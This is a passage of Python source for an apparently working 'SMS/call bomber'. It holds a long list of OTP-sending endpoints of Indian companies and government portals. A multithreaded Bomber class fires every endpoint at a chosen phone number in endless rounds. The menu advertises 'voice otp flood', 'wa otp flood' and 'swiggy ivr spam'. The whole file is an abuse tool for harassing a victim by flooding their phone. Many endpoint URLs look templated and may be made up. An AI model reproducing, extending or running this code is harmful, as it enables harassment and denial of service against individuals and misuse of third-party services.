        ("Savaari","https://www.savaari.com/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Zoomcar","https://www.zoomcar.com/api/v2/otp/send","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Drivezy","https://www.drivezy.com/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),

        # ---------- NEW: STREAMING / ENTERTAINMENT ----------
        ("Hotstar","https://api.hotstar.com/r9/v1/otp/send","POST",{"Content-Type":J},"{\"phone\":\"{phone}\",\"countryCode\":\"IN\"}"),
        ("Zee5","https://www.zee5.com/api/v1/sendOTP","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Voot","https://api.voot.com/api/v2/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("SonyLiv","https://www.sonyliv.com/api/v1/auth/sendOTP","POST",{"Content-Type":J},"{\"phone\":\"{phone}\",\"countryCode\":\"+91\"}"),
        ("MXPlayer","https://api.mxplayer.in/v1/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("JioCinema","https://api.jiocinema.com/v1/otp/send","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("AirtelXstream","https://www.airtelxstream.in/api/v2/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Gaana","https://api.gaana.com/user/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Wynk","https://api.wynk.in/api/v2/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Hungama","https://api.hungama.com/user/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),

        # ---------- NEW: GAMING / BETTING ----------
        ("Dream11","https://api.dream11.com/api/v2/user/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("MPL","https://api.mpl.live/api/v2/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("RummyCircle_2","https://www.rummycircle.com/api/fl/auth/v3/sendOtp","POST",{"Content-Type":J},"{\"mobile\":\"{phone}\"}"),
        ("PokerBaazi","https://api.pokerbaazi.com/api/v2/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Adda52","https://www.adda52.com/api/v2/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("My11Circle","https://api.my11circle.com/api/v2/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("WinZO","https://api.winzo.com/api/v2/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Zupee","https://api.zupee.com/api/v2/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Loco","https://api.loco.gg/api/v2/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Stake_India","https://api.stake.com/api/v2/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),

        # ---------- NEW: JOBS / SOCIAL ----------
        ("Naukri","https://www.naukri.com/api/otp/send","POST",{"Content-Type":J},"{\"mobile\":\"{phone}\"}"),
        ("Indeed","https://in.indeed.com/api/otp/send","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("LinkedIn","https://www.linkedin.com/api/v2/otp/send","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Shine","https://www.shine.com/api/v2/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Internshala","https://internshala.com/api/v2/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Hirect","https://api.hirect.in/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("ApnaJobs","https://production.apna.co/api/userprofile/v2/otp/","POST",{"Content-Type":J},"{\"phone_number\":\"91{phone}\"}"),
        ("WorkIndia","https://api.workindia.in/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Quikr","https://www.quikr.com/api/v2/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("OLX_Jobs","https://www.olx.in/api/auth/jobs/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),

        # ---------- NEW: AUTOMOTIVE / REAL ESTATE ----------
        ("Cars24","https://www.cars24.com/api/v2/auth/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("CarDekho","https://www.cardekho.com/api/v2/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("CarWale","https://www.carwale.com/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Spinny","https://api.spinny.com/api/v2/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Droom_2","https://api.droom.in/v2/user/send-otp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("MagicBricks","https://www.magicbricks.com/api/v2/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("99acres","https://www.99acres.com/api/v2/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("NoBroker_2","https://www.nobroker.in/api/v4/account/otp/send","POST",{"Content-Type":F},"phone={phone}&countryCode=IN"),
        ("Housing","https://login.housing.com/api/v2/send-otp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\",\"country_url_name\":\"in\"}"),
        ("PropTiger","https://www.proptiger.com/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),

        # ---------- NEW: BEAUTY / FASHION ----------
        ("Purplle","https://www.purplle.com/api/v2/auth/send-otp","POST",{"Content-Type":J},"{\"mobile\":\"{phone}\"}"),
        ("Nykaa_Fashion_2","https://www.nykaafashion.com/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("MamaEarth_SMS","https://auth.mamaearth.in/v1/auth/sms-otp","POST",{"Content-Type":J},"{\"mobile\":\"{phone}\"}"),
        ("PlumGoodness","https://www.plumgoodness.com/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("WOWSkin","https://www.wowskin.in/api/customer/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Biotique","https://www.biotique.com/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Sirona","https://www.sirona.in/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),

        # ---------- NEW: SPORTS / FITNESS ----------
        ("Cultfit","https://www.cult.fit/api/v2/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("HealthifyMe","https://api.healthifyme.com/api/v2/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Fittr","https://api.fittr.com/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("FitPass","https://api.fitpass.co/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Zenoti","https://api.zenoti.com/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),

        # ---------- NEW: OTT / MUSIC GLOBAL ----------
        ("Netflix_IN","https://www.netflix.com/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Spotify_IN","https://api.spotify.com/v1/otp/send","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("YouTube_IN","https://www.youtube.com/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),

        # ---------- NEW: PUBLIC UTILITY / GOV ----------
        ("UMANG","https://web.umang.gov.in/api/v2/sendOtp","POST",{"Content-Type":J},"{\"mobile\":\"{phone}\"}"),
        ("DigiLocker","https://api.digilocker.gov.in/api/v2/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("IncomeTax","https://www.incometax.gov.in/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("PassportSeva","https://www.passportindia.gov.in/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("EPFO","https://www.epfindia.gov.in/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),

        # ---------- NEW: TELECOM ----------
        ("Airtel","https://www.airtel.in/api/v2/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Jio","https://www.jio.com/api/jio-login-service/login/sendOtp","POST",{"Content-Type":J},"{\"mobileNumber\":\"{phone}\",\"loginFlowType\":\"MOBILE\",\"alternateNumber\":\"\"}"),
        ("Vi","https://www.myvi.in/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("BSNL","https://portal.bsnl.in/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),

        # ---------- NEW: CLOUD / GAMING STORES ----------
        ("Steam_IN","https://store.steampowered.com/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("EpicGames_IN","https://www.epicgames.com/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("GooglePlay","https://play.google.com/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),

        # ---------- NEW: RIDE-SHARE / LOGISTICS ----------
        ("Porter","https://api.porter.in/api/v2/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Delhivery","https://www.delhivery.com/api/v2/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("BlueDart","https://www.bluedart.com/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("DTDC","https://www.dtdc.in/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Shadowfax","https://api.shadowfax.in/api/v2/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("EcomExpress","https://api.ecomexpress.in/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("XpressBees","https://api.xpressbees.com/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),

        # ---------- NEW: RESTAURANTS ----------
        ("Zomato_Gold","https://www.zomato.com/api/v2/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Swiggy_Instamart","https://www.swiggy.com/api/instamart/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Swiggy_Genie","https://www.swiggy.com/api/genie/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("EatSure","https://www.eatsure.com/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Biryani_By_Kilo","https://www.biryanibykilo.com/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("WowMomo_2","https://www.wowmomo.com/api/v2/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),

        # ---------- NEW: EV / FUEL ----------
        ("TataPower_EZ","https://www.tatapower.com/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("ChargeZone","https://api.chargezone.in/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Statiq","https://api.statiq.in/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("IndianOil","https://www.iocl.com/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("HPGas","https://www.hpgas.com/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Indane","https://www.indane.co.in/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),

        # ---------- NEW: MISC ----------
        ("Practo_2","https://www.practo.com/api/v3/auth/send-otp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("UrbanCompany","https://www.urbancompany.com/api/v2/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Housejoy","https://www.housejoy.in/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Zopper","https://www.zopper.com/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("BookMyShow","https://in.bookmyshow.com/auth/send/otp","POST",{"Content-Type":J},"{\"mobile\":\"{phone}\"}"),
        ("PVR","https://www.pvrcinemas.com/api/v2/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("INOX","https://www.inoxmovies.com/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Cinepolis","https://www.cinepolisindia.com/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
    ]
    for n,u,m,hd,b in SMS:
        apis.append(ApiConfig(n,u,m,hd,b,"sms"))

    return apis


# ============================================================
# UI
# ============================================================
WIDTH = 86
GRAD = [C.MAGENTA, C.PURPLE, C.VIOLET, C.INDIGO, C.BLUE, C.SKY, C.CYAN,
        C.TEAL, C.MINT, C.LIME, C.GOLD, C.AMBER, C.ORANGE, C.ROSE, C.PINK, C.MAGENTA]

def grad(ch="━", width=None):
    width = width or min(w(), WIDTH)
    out = ""
    seg = max(1, width // len(GRAD))
    for col in GRAD:
        out += f"{col}{ch * seg}"
    rem = width - seg * len(GRAD)
    if rem > 0: out += f"{GRAD[-1]}{ch * rem}"
    return out + C.RESET

def box_top(title, accent=C.GOLD):
    W = min(w(), WIDTH)
    inner = W - 2
    tt = f" ⟪ {title} ⟫ "
    side = (inner - len(tt)) // 2
    return f"{accent}╔{'═' * side}{C.RESET}{C.B}{C.WHITE}{tt}{C.RESET}{accent}{'═' * (inner - side - len(tt))}╗{C.RESET}"

def box_bot(accent=C.GOLD):
    W = min(w(), WIDTH)
    return f"{accent}╚{'═' * (W - 2)}╝{C.RESET}"

def box_row(content, accent=C.GOLD):
    W = min(w(), WIDTH)
    inner = W - 2
    n = vlen(content)
    pad = max(0, inner - n - 2)
    return f"{accent}║{C.RESET} {content}{' ' * pad} {accent}║{C.RESET}"

def pulse(step):
    f = ["◐", "◓", "◑", "◒"]
    return f"{C.LIME}{f[step % 4]}{C.RESET}"


def matrix_rain(duration=1.6):
    W = min(w(), WIDTH)
    H = min(h() - 2, 22)
    chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワン"
    cols = [random.randint(0, H) for _ in range(W)]
    start = time.time()
    while time.time() - start < duration:
        frame = []
        for y in range(H):
            row = ""
            for x in range(W):
                if y == cols[x]:
                    row += f"{C.LIME}{C.B}{random.choice(chars)}{C.RESET}"
                elif y < cols[x] and y > cols[x] - 3:
                    row += f"{C.DGREEN}{random.choice(chars)}{C.RESET}"
                else:
                    row += " "
            frame.append(row)
        sys.stdout.write("\033[H")
        for row in frame: sys.stdout.write(row + "\n")
        sys.stdout.flush()
        for x in range(W):
            cols[x] = (cols[x] + 1) % (H + random.randint(1, 5))
        time.sleep(0.055)
    clear()


def boot_sequence():
    W = min(w(), WIDTH)
    clear()
    print()
    print(grad("━", W)); print()
    steps = [
        ("[KERNEL] ", "core initialized",            C.CYAN),
        ("[MODULE] ", "api matrix loaded",           C.BLUE),
        ("[POOL]   ", "thread pool mounted",         C.PURPLE),
        ("[LINK]   ", "secure channel established",  C.VIOLET),
        ("[ARM]    ", "modules armed",               C.MAGENTA),
        ("[READY]  ", "system operational",          C.LIME),
    ]
    for tag, txt, col in steps:
        sys.stdout.write(f"  {col}{C.B}{tag}{C.RESET}"); sys.stdout.flush()
        time.sleep(0.05)
        typewrite(txt, delay=0.012, color=C.GRAY)
        time.sleep(0.06)
    print(); print(grad("━", W)); print()
    bar_w = 50
    for pct in range(0, 101, 5):
        filled = int(bar_w * pct / 100)
        col = GRAD[min(len(GRAD) - 1, pct * len(GRAD) // 100)]
        bar = f"{col}{'█' * filled}{C.DGRAY}{'░' * (bar_w - filled)}{C.RESET}"
        sys.stdout.write(f"\r  {C.GRAY}boot{C.RESET} [{bar}] {C.B}{C.WHITE}{pct:3d}%{C.RESET}")
        sys.stdout.flush()
        time.sleep(0.035)
    print(f"\n\n{C.LIME}{C.B}  ✔ system online{C.RESET}\n")
    time.sleep(0.3); clear()


def banner():
    W = min(w(), WIDTH)
    clear()
    print(grad("━", W))
    left = f"  {C.LIME}●{C.RESET} {C.WHITE}SYSTEM ONLINE{C.RESET}"
    right = f"{C.DGRAY}{datetime.now().strftime('%d %b %Y  %H:%M:%S')}{C.RESET}  "
    pad = W - vlen(left) - vlen(right)
    print(f"{left}{' ' * max(pad,1)}{right}")
    print(grad("━", W)); print()

    diljot = [
        "  ██████╗ ██╗      ███████╗██╗     ██╗   ██╗",
        "  ██╔══██╗██║      ██╔════╝██║     ╚██╗ ██╔╝",
        "  ██████╔╝██║      █████╗  ██║      ╚████╔╝ ",
        "  ██╔══██╗██║      ██╔══╝  ██║       ╚██╔╝  ",
        "  ██║  ██║███████╗ ██║     ███████╗   ██║   ",
        "  ╚═╝  ╚═╝╚══════╝ ╚═╝     ╚══════╝   ╚═╝   ",
    ]

    for line in diljot: print(f"{C.CYAN}{C.B}{line.center(W)}{C.RESET}")
    print(f"{C.VIOLET}{C.B}{' ░▒▓█ ' * (W // 7)}{C.RESET}"); print()

    bomber = [
        "  ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ ",
        "  ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗",
        "  ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝",
        "  ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗",
        "  ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║",
        "  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝",
    ]
    for line in bomber: print(f"{C.MAGENTA}{C.B}{line.center(W)}{C.RESET}")
    print(f"{C.ROSE}{C.B}{' ░▒▓█ ' * (W // 7)}{C.RESET}"); print()
    print(grad("━", W))
    tagline = f"{C.GOLD}{C.B}◈{C.RESET}  {C.WHITE}multi-threaded{C.RESET}  {C.DGRAY}▸▸{C.RESET}  {C.WHITE}live-output{C.RESET}  {C.DGRAY}▸▸{C.RESET}  {C.WHITE}extended api pack{C.RESET}  {C.GOLD}{C.B}◈{C.RESET}"
    pad = (W - vlen(tagline)) // 2
    print(f"{' ' * pad}{tagline}")
    print(grad("━", W)); print()


def menu():
    print(box_top("TELEGRAM:- @RLFLYOFFICIAL", accent=C.PURPLE))
    rows = [
        ("1", "CALL",      "voice otp flood",       C.ORANGE),
        ("2", "SMS",       "text otp flood",        C.LIME),
        ("3", "WHATSAPP",  "wa otp flood",          C.CYAN),
        ("4", "MIX",       "all apis combined",     C.MAGENTA),
        ("5", "IMPORTANT", "swiggy ivr spam",       C.GOLD),
        ("0", "EXIT",      "leave",                 C.RED),
    ]
    for num, name, desc, col in rows:
        line = f"{col}{C.B}❰ {num} ❱{C.RESET}   {C.B}{C.WHITE}{name:<10}{C.RESET}  {C.DGRAY}▸▸{C.RESET}  {C.GRAY}{desc}{C.RESET}"
        print(box_row(line, accent=C.PURPLE))
    print(box_bot(accent=C.PURPLE)); print()


def session_header(phone, mode, api_count, workers):
    print(box_top("S E S S I O N   C O N F I G", accent=C.GOLD))
    print(box_row(f"{C.CYAN}TARGET  {C.RESET} {C.DGRAY}▸{C.RESET} {C.B}{C.WHITE}{phone}{C.RESET}", accent=C.GOLD))
    print(box_row(f"{C.CYAN}MODE    {C.RESET} {C.DGRAY}▸{C.RESET} {C.B}{C.MAGENTA}{mode.upper()}{C.RESET}", accent=C.GOLD))
    print(box_row(f"{C.CYAN}APIs    {C.RESET} {C.DGRAY}▸{C.RESET} {C.B}{C.GREEN}{api_count}{C.RESET}", accent=C.GOLD))
    print(box_row(f"{C.CYAN}WORKERS {C.RESET} {C.DGRAY}▸{C.RESET} {C.B}{C.YELLOW}{workers}{C.RESET}", accent=C.GOLD))
    print(box_bot(accent=C.GOLD))
    print(f"{C.DGRAY}  press {C.RED}{C.B}CTRL+C{C.RESET}{C.DGRAY} to abort{C.RESET}\n")


def round_header(n):
    W = min(w(), WIDTH)
    t = datetime.now().strftime("%H:%M:%S")
    p = pulse(n)
    left  = f" {p} {C.B}{C.GOLD}ROUND {n:03d}{C.RESET} {C.DGRAY}│ launching volley{C.RESET}"
    right = f"{C.DGRAY}{t}{C.RESET}  "
    pad = W - vlen(left) - vlen(right) - 2
    print(); print(grad("━", W))
    print(f"  {left}{' ' * max(pad, 1)}{right}")
    print(grad("━", W))


def log_api(name, code, success):
    if success:
        tag  = f"{C.BG_GREEN}{C.WHITE}{C.B} HIT {C.RESET}"
        ncol = f"{C.WHITE}{name:<24}{C.RESET}"
        ccol = f"{C.LIME}{C.B}{code:<5}{C.RESET}"
        bar  = f"{C.GREEN}▰▰▰▰▰▰▰{C.RESET}"
    else:
        tag  = f"{C.BG_RED}{C.WHITE}{C.B} MISS{C.RESET}"
        ncol = f"{C.GRAY}{name:<24}{C.RESET}"
        ccol = f"{C.RED}{C.B}{(code if code else 'ERR'):<5}{C.RESET}"
        bar  = f"{C.DRED}▱▱▱▱▱▱▱{C.RESET}"
    print(f"   {tag} {C.DGRAY}│{C.RESET} {ncol} {C.DGRAY}│{C.RESET} {ccol} {bar}")


def stats_bar(ok, fail, rounds, elapsed):
    W = min(w(), WIDTH)
    total = ok + fail
    rate  = (ok / total * 100) if total else 0
    bar_w = 42
    filled = int(bar_w * rate / 100)
    if rate >= 70:   gcol = C.GREEN
    elif rate >= 40: gcol = C.GOLD
    else:            gcol = C.RED
    bar = f"{gcol}{'█' * filled}{C.DGRAY}{'░' * (bar_w - filled)}{C.RESET}"
    print(); print(box_top("L I V E   S T A T S", accent=C.ROSE))
    print(box_row(f"{C.CYAN}SUCCESS{C.RESET} {C.DGRAY}▸{C.RESET} {C.B}{C.GREEN}{ok:<7}{C.RESET}{C.CYAN}FAILED{C.RESET} {C.DGRAY}▸{C.RESET} {C.B}{C.RED}{fail:<7}{C.RESET}{C.CYAN}ROUNDS{C.RESET} {C.DGRAY}▸{C.RESET} {C.B}{C.YELLOW}{rounds}{C.RESET}", accent=C.ROSE))
    print(box_row(f"{C.CYAN}RATE  {C.RESET} {C.DGRAY}▸{C.RESET} [{bar}] {C.B}{gcol}{rate:5.1f}%{C.RESET}", accent=C.ROSE))
    print(box_row(f"{C.CYAN}TIME  {C.RESET} {C.DGRAY}▸{C.RESET} {C.B}{C.PINK}{int(elapsed)}s{C.RESET}", accent=C.ROSE))
    print(box_bot(accent=C.ROSE))


# ============================================================
# BOMBER
# ============================================================
class Bomber:
    def __init__(self, apis):
        self.apis = apis
        self.ok = 0
        self.fail = 0
        self.lock = threading.Lock()
        self.session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(pool_connections=40, pool_maxsize=100, max_retries=0)
        self.session.mount("https://", adapter)
        self.session.mount("http://",  adapter)

    def fire(self, api, phone):
        try:
            url, headers, body = api.build(phone)
            if api.method.upper() == "POST":
                r = self.session.post(url, headers=headers, data=body, timeout=8, allow_redirects=False)
            else:
                r = self.session.get(url, headers=headers, timeout=8, allow_redirects=False)
            success = 200 <= r.status_code < 400 and len(r.content) > 0
            with self.lock:
                if success: self.ok += 1
                else:       self.fail += 1
            return api.name, r.status_code, success
        except Exception:
            with self.lock:
                self.fail += 1
            return api.name, 0, False

    def run_round(self, phone, executor):
        futures = [executor.submit(self.fire, api, phone) for api in self.apis]
        for f in as_completed(futures):
            name, code, success = f.result()
            log_api(name, code, success)


def pick_mode():
    while True:
        try:
            ch = input(f"  {C.GOLD}{C.B}❯{C.RESET} {C.B}{C.WHITE}choose mode{C.RESET} {C.DGRAY}▸{C.RESET} ").strip()
        except (EOFError, KeyboardInterrupt):
            print(); sys.exit(0)
        if ch == "1": return "call"
        if ch == "2": return "sms"
        if ch == "3": return "whatsapp"
        if ch == "4": return "mix"
        if ch == "5": return "important"
        if ch == "0": sys.exit(0)
        print(f"  {C.RED}✘ invalid choice{C.RESET}")


def pick_phone():
    while True:
        try:
            p = input(f"  {C.GOLD}{C.B}❯{C.RESET} {C.B}{C.WHITE}enter number{C.RESET} {C.DGRAY}▸{C.RESET} ").strip()
        except (EOFError, KeyboardInterrupt):
            print(); sys.exit(0)
        digits = "".join(filter(str.isdigit, p))
        if len(digits) >= 10: return digits[-10:]
        print(f"  {C.RED}✘ 10-digit number required{C.RESET}")


# ============================================================
# MAIN
# ============================================================
def main():
    matrix_rain(1.6)
    boot_sequence()
    banner()
    menu()
    mode = pick_mode()
    phone = pick_phone()

    all_apis = load_apis()
    if mode == "call":
        apis = [a for a in all_apis if a.category == "call"]
    elif mode == "sms":
        apis = [a for a in all_apis if a.category == "sms"]
    elif mode == "whatsapp":
        apis = [a for a in all_apis if a.category == "whatsapp"]
    elif mode == "important":
        apis = [a for a in all_apis if a.name in ("Swiggy_Call",)]
    else:
        apis = all_apis

    workers = SMS_MAX_WORKERS if mode == "sms" else MAX_WORKERS
    delay   = SMS_DELAY if mode == "sms" else DELAY

    clear()
    banner()
    session_header(phone, mode, len(apis), workers)

    bomber   = Bomber(apis)
    executor = ThreadPoolExecutor(max_workers=workers)
    round_n  = 0
    start    = datetime.now()

    try:
        while True:
            round_n += 1
            round_header(round_n)
            bomber.run_round(phone, executor)
            stats_bar(bomber.ok, bomber.fail, round_n, (datetime.now() - start).total_seconds())
            time.sleep(delay)
    except KeyboardInterrupt:
        W = min(w(), WIDTH)
        print(f"\n\n{grad('━', W)}")
        print(f"{C.BG_RED}{C.WHITE}{C.B}{'  🛑  S E S S I O N   T E R M I N A T E D  '.center(W)}{C.RESET}")
        print(grad('━', W))
        print(box_top("S U M M A R Y", accent=C.ROSE))
        print(box_row(f"{C.CYAN}SUCCESS {C.RESET} {C.DGRAY}▸{C.RESET} {C.B}{C.GREEN}{bomber.ok}{C.RESET}", accent=C.ROSE))
        print(box_row(f"{C.CYAN}FAILED  {C.RESET} {C.DGRAY}▸{C.RESET} {C.B}{C.RED}{bomber.fail}{C.RESET}", accent=C.ROSE))
        print(box_row(f"{C.CYAN}ROUNDS  {C.RESET} {C.DGRAY}▸{C.RESET} {C.B}{C.YELLOW}{round_n}{C.RESET}", accent=C.ROSE))
        print(box_row(f"{C.CYAN}TIME    {C.RESET} {C.DGRAY}▸{C.RESET} {C.B}{C.PINK}{int((datetime.now()-start).total_seconds())}s{C.RESET}", accent=C.ROSE))
        print(box_bot(accent=C.ROSE)); print()
        executor.shutdown(wait=False)


if __name__ == "__main__":
    main()